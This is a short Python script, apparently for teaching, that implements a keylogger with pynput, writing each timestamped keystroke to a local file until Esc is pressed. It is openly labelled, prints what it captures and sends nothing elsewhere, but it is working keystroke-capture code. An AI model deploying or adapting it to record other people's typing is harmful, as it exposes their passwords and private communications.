print ("""
==========================================================================

Author : Akshay Sannakki                                Date : 2024-11-06

Email ID : akshaysannakki@gmail.com                 License : MIT License

==========================================================================
# Disclaimer : For educational purposes only.
==========================================================================
""")

from pynput import keyboard
import time

def keyPressed(key):
    """
    Logs pressed keys to a file with timestamps.

    Args:
        key: The key object captured by the listener.
    """
    try:
        with open("keylog.txt", 'a') as logkey:
            logkey.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
    except AttributeError:
        with open("keylog.txt", 'a') as logkey:
            logkey.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [{key}]\n")
    print(f"Key pressed: {key}")  # Optional console display

    # Stop keylogger when 'Esc' is pressed
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False  # This will stop the listener

if __name__ == "__main__":
    print("Keylogger started. Press 'Esc' to stop.")
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()
